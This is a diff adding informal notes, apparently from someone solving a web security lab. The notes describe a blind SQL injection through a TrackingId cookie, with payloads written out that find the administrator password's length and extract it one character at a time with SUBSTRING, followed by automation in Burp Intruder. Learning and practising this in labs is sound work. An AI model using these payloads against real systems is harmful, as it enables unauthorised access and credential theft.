@@ -1,0 +1,23 @@
+Soooo
+I think i will have to determine the pasword one after the other 
+
+Cookkie TrackingID is vulnerable to Blind SQLi
+so i will use this command
+
+TrackingId=sQsGJUQVn1wiOpJy' AND SUBSTRING((SELECT password FROM users WHERE Username = 'administrator'), 1, 1) > 'f;
+
+Letters I have gotten = dttyorpgzkuc2lv20m1g
+
+I was thinking, can i use intruder ?
+
+ofc i can 
+first, i need to determine the length of the password
+haha, i can use blind sqli 
+
+use this 
+Cookie: TrackingId=2z6eY1G26A7ihaX4' AND LENGTH((SELECT password FROM users WHERE Username = 'administrator')) > 1--;
+using the above command i found out that the length of the password is 20
+
+now i move to intruder 
+
+It works, Alhamdulillah
